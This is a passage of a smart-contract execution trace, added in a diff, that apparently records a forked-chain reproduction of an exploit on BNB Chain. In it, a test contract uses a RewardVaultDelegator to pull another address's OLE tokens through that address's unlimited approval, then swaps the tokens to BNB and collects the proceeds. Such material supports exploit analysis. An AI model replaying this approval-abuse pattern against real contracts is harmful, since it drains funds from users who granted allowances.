+    │   │   │   │   │   │   │   ├─ [592] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::beforeTransferHandler(0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, 0x231d9e7181E8479A8B40930961e93E7ed798542C, 119752778490788 [1.197e14])
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ [5061] 0xbBD372407eaD5729657Aeb2DEB86468a0d593520::getTax(0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, 0x231d9e7181E8479A8B40930961e93E7ed798542C, 119752778490788 [1.197e14]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [636] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::afterTransferHandler(0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, 0x231d9e7181E8479A8B40930961e93E7ed798542C, 119752778490788 [1.197e14])
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, to: 0x231d9e7181E8479A8B40930961e93E7ed798542C, value: 119752778490788 [1.197e14])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x524851b765e0f1ef09be2e01d47ba842a0f75766b2b27657ce7360c51eae490f: 0x0000000000000000000000000000000000000000000000045fa83b0741a10898 → 0x0000000000000000000000000000000000000000000000045fa8a7f15f73ac3c
+    │   │   │   │   │   │   │   │   @ 0xafb6909aa212f9dd2b6efb2b676416de842c3e87d0e64d5e2d832aca11863f04: 0x00000000000000000000000000000000000000000000000000006cea1dd2a3a4 → 0
+    │   │   │   │   │   │   │   │   @ 0x1634c95e59728bb6cba6e2a9236f3ea0dbd6643ff5cabbe8ec6240e83a644a20: 0x000000000000000000000000000000000000000000000000000079042122eeb6 → 0x00000000000000000000000000000000000000000000000000000c1a03504b12
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [2893] 0x231d9e7181E8479A8B40930961e93E7ed798542C::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 9899992869528405829875 [9.899e21], 80679800426880632984 [8.067e19], 1697963193 [1.697e9]
+    │   │   │   │   │   │   ├─ [605] FLOKI::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 80679920179659123772 [8.067e19]
+    │   │   │   │   │   │   ├─ [62413] 0x231d9e7181E8479A8B40930961e93E7ed798542C::swap(14657770803280085 [1.465e16], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   │   │   │   ├─ [27962] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 14657770803280085 [1.465e16])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x231d9e7181E8479A8B40930961e93E7ed798542C, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 14657770803280085 [1.465e16])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x6fdf364908c4c6af792ff545d123c0567dac9f5579de88a0e36a1a4c2f8d7413: 0x000000000000000000000000000000000000000000000218ae00166d04bc68f3 → 0x000000000000000000000000000000000000000000000218adcc0342ceceb01e
+    │   │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x0000000000000000000000000000000000000000000000000034132a35edb8d5
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 9899978211757602549790 [9.899e21]
+    │   │   │   │   │   │   │   ├─ [605] FLOKI::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 80679920179659123772 [8.067e19]
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 9899978211757602549790 [9.899e21], reserve1: 80679920179659123772 [8.067e19])
+    │   │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 119752778490788 [1.197e14], amount0Out: 14657770803280085 [1.465e16], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 8: 0x6534dcb90000000000045fa83b0741a10898000000000218ae00166d04bc68f3 → 0x6534dcbc0000000000045fa8a7f15f73ac3c000000000218adcc0342ceceb01e
+    │   │   │   │   │   │   │   │   @ 9: 0x0000000000000000000000000000001064c4d0fe15568c3ac1e86a7e606fea94 → 0x0000000000000000000000000000001064c4d74056214b161c58d28e25873332
+    │   │   │   │   │   │   │   │   @ 10: 0x0000000000000000000000000000e4fa12aca858cbc94a412245a46fc9fd3a05 → 0x0000000000000000000000000000e4fa141cc77b19d593a27803a5becff416d3
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 14657770803280085 [1.465e16]
+    │   │   │   │   │   │   ├─ [9223] WBNB::withdraw(14657770803280085 [1.465e16])
+    │   │   │   │   │   │   │   ├─ [83] Router::fallback{value: 14657770803280085}()
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 14657770803280085 [1.465e16])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x0000000000000000000000000000000000000000000000000034132a35edb8d5 → 0
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [55] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::fallback{value: 14657770803280085}()
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [22566] FLOKI::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 13305864276754 [1.33e13])
+    │   │   │   │   │   │   ├─ emit Approval(owner: 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 13305864276754 [1.33e13])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xafb6909aa212f9dd2b6efb2b676416de842c3e87d0e64d5e2d832aca11863f04: 0 → 0x00000000000000000000000000000000000000000000000000000c1a03504b12
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [122227] Router::addLiquidityETH{value: 2931554160656017}(FLOKI: [0xfb5B838b6cfEEdC2873aB27866079AC55363D37E], 13305864276754 [1.33e13], 0, 0, 0x17e98a24f992BB7bcd62d6722d714A3C74814B94, 1697963196 [1.697e9])
+    │   │   │   │   │   │   ├─ [2676] Recovery::getPair(FLOKI: [0xfb5B838b6cfEEdC2873aB27866079AC55363D37E], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000231d9e7181e8479a8b40930961e93e7ed798542c
+    │   │   │   │   │   │   ├─ [893] 0x231d9e7181E8479A8B40930961e93E7ed798542C::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 9899978211757602549790 [9.899e21], 80679920179659123772 [8.067e19], 1697963196 [1.697e9]
+    │   │   │   │   │   │   ├─ [10412] FLOKI::transferFrom(0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, 0x231d9e7181E8479A8B40930961e93E7ed798542C, 13305864276754 [1.33e13])
+    │   │   │   │   │   │   │   ├─ [592] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::beforeTransferHandler(0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, 0x231d9e7181E8479A8B40930961e93E7ed798542C, 13305864276754 [1.33e13])
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ [1061] 0xbBD372407eaD5729657Aeb2DEB86468a0d593520::getTax(0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, 0x231d9e7181E8479A8B40930961e93E7ed798542C, 13305864276754 [1.33e13]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [636] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::afterTransferHandler(0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, 0x231d9e7181E8479A8B40930961e93E7ed798542C, 13305864276754 [1.33e13])
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, to: 0x231d9e7181E8479A8B40930961e93E7ed798542C, value: 13305864276754 [1.33e13])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x524851b765e0f1ef09be2e01d47ba842a0f75766b2b27657ce7360c51eae490f: 0x0000000000000000000000000000000000000000000000045fa8a7f15f73ac3c → 0x0000000000000000000000000000000000000000000000045fa8b40b62c3f74e
+    │   │   │   │   │   │   │   │   @ 0xafb6909aa212f9dd2b6efb2b676416de842c3e87d0e64d5e2d832aca11863f04: 0x00000000000000000000000000000000000000000000000000000c1a03504b12 → 0
+    │   │   │   │   │   │   │   │   @ 0x1634c95e59728bb6cba6e2a9236f3ea0dbd6643ff5cabbe8ec6240e83a644a20: 0x00000000000000000000000000000000000000000000000000000c1a03504b12 → 0
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [21974] WBNB::deposit{value: 1632720584442018}()
+    │   │   │   │   │   │   │   ├─ emit Deposit(dst: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1632720584442018 [1.632e15])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x0000000000000000000000000000000000000000000000000005ccf3627400a2
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [3262] WBNB::transfer(0x231d9e7181E8479A8B40930961e93E7ed798542C, 1632720584442018 [1.632e15])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: 0x231d9e7181E8479A8B40930961e93E7ed798542C, value: 1632720584442018 [1.632e15])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x6fdf364908c4c6af792ff545d123c0567dac9f5579de88a0e36a1a4c2f8d7413: 0x000000000000000000000000000000000000000000000218adcc0342ceceb01e → 0x000000000000000000000000000000000000000000000218add1d0363142b0c0
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x0000000000000000000000000000000000000000000000000005ccf3627400a2 → 0
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [60118] 0x231d9e7181E8479A8B40930961e93E7ed798542C::mint(0x17e98a24f992BB7bcd62d6722d714A3C74814B94)
+    │   │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 9899979844478186991808 [9.899e21]
+    │   │   │   │   │   │   │   ├─ [605] FLOKI::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 80679933485523400526 [8.067e19]
+    │   │   │   │   │   │   │   ├─ [2354] Recovery::feeTo() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000ed943ce24baebf257488771759f9bf482c39706
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 186032391823389 [1.86e14])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x17e98a24f992BB7bcd62d6722d714A3C74814B94, value: 130599229635841 [1.305e14])
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 9899979844478186991808 [9.899e21], reserve1: 80679933485523400526 [8.067e19])
+    │   │   │   │   │   │   │   ├─ emit Mint(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 1632720584442018 [1.632e15], amount1: 13305864276754 [1.33e13])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xce5a46cd565c798db4579e1721082d7b4156f14a385995b283ae5d8d572faf65: 0x000000000000000000000000000000000000000000000000003cb8640f2f5b8c → 0x000000000000000000000000000000000000000000000000003d619619d0fba9
+    │   │   │   │   │   │   │   │   @ 0: 0x00000000000000000000000000000000000000000000002aeda1a4438a733907 → 0x00000000000000000000000000000000000000000000002aeda2c43d15c59625
+    │   │   │   │   │   │   │   │   @ 11: 0x0000000000000000000000000000092b405f06873401c8b50018b6a6114461cf → 0x0000000000000000000000000000092b4173a0e390aa0f12fe195fc07d1b1a80
+    │   │   │   │   │   │   │   │   @ 0xc7700dabe149670efd0d9cfdd162b16aa5cdfd1460f3a3070757d700771c9415: 0x00000000000000000000000000000000000000000000000221a539aaee0d88e4 → 0x00000000000000000000000000000000000000000000000221a5b0726ebe45e5
+    │   │   │   │   │   │   │   │   @ 8: 0x6534dcbc0000000000045fa8a7f15f73ac3c000000000218adcc0342ceceb01e → 0x6534dcbc0000000000045fa8b40b62c3f74e000000000218add1d0363142b0c0
+    │   │   │   │   │   │   │   └─ ← [Return] 130599229635841 [1.305e14]
+    │   │   │   │   │   │   ├─ [55] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::fallback{value: 1298833576213999}()
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000c1a03504b120000000000000000000000000000000000000000000000000005ccf3627400a2000000000000000000000000000000000000000000000000000076c780b0bd01
+    │   │   │   │   │   ├─ [6329] 0x17e98a24f992BB7bcd62d6722d714A3C74814B94::fallback{value: 13025050218838067}()
+    │   │   │   │   │   │   ├─ [1504] GnosisSafeL2::receive{value: 13025050218838067}() [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit SafeReceived(sender: 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, value: 13025050218838067 [1.302e16])
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [18249] 0xbBD372407eaD5729657Aeb2DEB86468a0d593520::getTax(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 0x231d9e7181E8479A8B40930961e93E7ed798542C, 12341371593503104 [1.234e16]) [staticcall]
+    │   │   │   │   │   ├─ [605] FLOKI::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 80679933485523400526 [8.067e19]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000021ac5935a95d
+    │   │   │   │   ├─ emit Transfer(from: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], to: 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, value: 37024114780509 [3.702e13])
+    │   │   │   │   ├─ [743] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::afterTransferHandler(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 0x231d9e7181E8479A8B40930961e93E7ed798542C, 12341371593503104 [1.234e16])
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Transfer(from: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], to: 0x231d9e7181E8479A8B40930961e93E7ed798542C, value: 12304347478722595 [1.23e16])
+    │   │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457571666541536136831 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5dd0d100d6ef599f20166740b2e71d0223f85b731eb6539d6e1b9d28f50e794b: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffd427968220ce7f
+    │   │   │   │   │   @ 0x90baa12f5501a2c74e4d379a77ae786191ada734f14bf70a076f9df8fe256e42: 0x000000000000000000000000000000000000000000000000002bd8697ddf3180 → 0
+    │   │   │   │   │   @ 0x1634c95e59728bb6cba6e2a9236f3ea0dbd6643ff5cabbe8ec6240e83a644a20: 0 → 0x000000000000000000000000000000000000000000000000000021ac5935a95d
+    │   │   │   │   │   @ 0x524851b765e0f1ef09be2e01d47ba842a0f75766b2b27657ce7360c51eae490f: 0x0000000000000000000000000000000000000000000000045fa8b40b62c3f74e → 0x0000000000000000000000000000000000000000000000045fd46ac8876d7f71
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [893] 0x231d9e7181E8479A8B40930961e93E7ed798542C::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 9899979844478186991808 [9.899e21], 80679933485523400526 [8.067e19], 1697963196 [1.697e9]
+    │   │   │   ├─ [605] FLOKI::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   └─ ← [Return] 80692237833002123121 [8.069e19]
+    │   │   │   ├─ [38329] 0x231d9e7181E8479A8B40930961e93E7ed798542C::swap(1505823975667097830 [1.505e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1505823975667097830 [1.505e18])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x231d9e7181E8479A8B40930961e93E7ed798542C, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1505823975667097830 [1.505e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x6fdf364908c4c6af792ff545d123c0567dac9f5579de88a0e36a1a4c2f8d7413: 0x000000000000000000000000000000000000000000000218add1d0363142b0c0 → 0x00000000000000000000000000000000000000000000021898ec0d48b55b4fda
+    │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x00000000000000000000000000000000000000000000000014e5c2ed7be760e6
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 9898474020502519893978 [9.898e21]
+    │   │   │   │   ├─ [605] FLOKI::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 80692237833002123121 [8.069e19]
+    │   │   │   │   ├─ emit Sync(reserve0: 9898474020502519893978 [9.898e21], reserve1: 80692237833002123121 [8.069e19])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 12304347478722595 [1.23e16], amount0Out: 1505823975667097830 [1.505e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x6534dcbc0000000000045fa8b40b62c3f74e000000000218add1d0363142b0c0 → 0x6534dcbc0000000000045fd46ac8876d7f7100000000021898ec0d48b55b4fda
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1505823975667097830 [1.505e18]
+    │   │   │   ├─ [9223] WBNB::withdraw(1505823975667097830 [1.505e18])
+    │   │   │   │   ├─ [83] Router::fallback{value: 1505823975667097830}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1505823975667097830 [1.505e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x00000000000000000000000000000000000000000000000014e5c2ed7be760e6 → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [55] ContractTest::receive{value: 1505823975667097830}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24667] OLE::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xcc1f237a52133620f683e007870ea42e5cec642b9305b78c00b615a77a9c4d90: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2641] OLE::balanceOf(0x3BD0FeC7243B1ba658FAF4bC22663b5AdC04CF04) [staticcall]
+    │   │   │   └─ ← [Return] 338567405978148292343 [3.385e20]
+    │   │   ├─ [2771] OLE::allowance(0x3BD0FeC7243B1ba658FAF4bC22663b5AdC04CF04, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   │   ├─ [11329] OLE::transferFrom(0x3BD0FeC7243B1ba658FAF4bC22663b5AdC04CF04, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 338567405978148292343 [3.385e20])
+    │   │   │   ├─ emit Transfer(from: 0x3BD0FeC7243B1ba658FAF4bC22663b5AdC04CF04, to: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], value: 338567405978148292343 [3.385e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x82d5ac3b1a98b3ef2c6cbea94f7a63f0d0121add8af6a48b42068914cbf05f9d: 0x0000000000000000000000000000000000000000000000125a910dee1cfe46f7 → 0
+    │   │   │   │   @ 0xfcde93add1f04273e6b56cdb4bd777efb215f4c3e4d6e9ccc1ca0daa16a40187: 0x0000000000000000000000000000000000000000000000c381c6331deae13358 → 0x0000000000000000000000000000000000000000000000d5dc57410c07df7a4f
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [641] OLE::balanceOf(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 3945033718231379966543 [3.945e21]
+    │   │   ├─ [100961] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(3945033718231379966543 [3.945e21], 0, [0xa865197A84E780957422237B5D152772654341F3, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1697964196 [1.697e9])
+    │   │   │   ├─ [8529] OLE::transferFrom(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 0x031835cffd7860Bd41B6E3e678713B9265C1ba40, 3945033718231379966543 [3.945e21])
+    │   │   │   │   ├─ emit Transfer(from: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], to: 0x031835cffd7860Bd41B6E3e678713B9265C1ba40, value: 3945033718231379966543 [3.945e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xfcde93add1f04273e6b56cdb4bd777efb215f4c3e4d6e9ccc1ca0daa16a40187: 0x0000000000000000000000000000000000000000000000d5dc57410c07df7a4f → 0
+    │   │   │   │   │   @ 0x12b87ca2b3161aae0044e6b41aa7daf76d1e5d4286c2a0c5d4f6581576a7607a: 0x0000000000000000000000000000000000000000000000951ca57a279b6c7d21 → 0x00000000000000000000000000000000000000000000016af8fcbb33a34bf770
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2893] 0x031835cffd7860Bd41B6E3e678713B9265C1ba40::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 2750629057297472322849 [2.75e21], 102011242629470077 [1.02e17], 1697822932 [1.697e9]
+    │   │   │   ├─ [641] OLE::balanceOf(0x031835cffd7860Bd41B6E3e678713B9265C1ba40) [staticcall]
+    │   │   │   │   └─ ← [Return] 6695662775528852289392 [6.695e21]
+    │   │   │   ├─ [62449] 0x031835cffd7860Bd41B6E3e678713B9265C1ba40::swap(0, 60042431100287365 [6.004e16], Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   ├─ [27962] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 60042431100287365 [6.004e16])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x031835cffd7860Bd41B6E3e678713B9265C1ba40, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 60042431100287365 [6.004e16])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2a38d9eb189e4e4947cb666285e96b71b59d7599c72eabbb19193e872a200e45: 0x000000000000000000000000000000000000000000000000016a6aaf4806977d → 0x00000000000000000000000000000000000000000000000000951a6966d79df8
+    │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x00000000000000000000000000000000000000000000000000d55045e12ef985
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [641] OLE::balanceOf(0x031835cffd7860Bd41B6E3e678713B9265C1ba40) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 6695662775528852289392 [6.695e21]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x031835cffd7860Bd41B6E3e678713B9265C1ba40) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 41968811529182712 [4.196e16]
+    │   │   │   │   ├─ emit Sync(reserve0: 6695662775528852289392 [6.695e21], reserve1: 41968811529182712 [4.196e16])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 3945033718231379966543 [3.945e21], amount1In: 0, amount0Out: 0, amount1Out: 60042431100287365 [6.004e16], to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x6532b8d4000000000000016a6aaf4806977d0000000000951ca57a279b6c7d21 → 0x6534dcbc00000000000000951a6966d79df800000000016af8fcbb33a34bf770
+    │   │   │   │   │   @ 10: 0x000000000000000000000000009d1f4601c4a2d1b490d26381b3bb21836ad82f → 0x000000000000000000000000009e00b3e6ac574afffb6025152dbe1e78d7549f
+    │   │   │   │   │   @ 9: 0x00000000000000000000000000000000157764cbb0bf3be16ab3e6d3ca81b271 → 0x00000000000000000000000000000000157c987b97467d60d6982320463e9561
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   └─ ← [Return] 60042431100287365 [6.004e16]
+    │   │   │   ├─ [9223] WBNB::withdraw(60042431100287365 [6.004e16])
+    │   │   │   │   ├─ [83] Router::fallback{value: 60042431100287365}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 60042431100287365 [6.004e16])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x00000000000000000000000000000000000000000000000000d55045e12ef985 → 0
+    │   │   │   │   └─ ← [Stop]
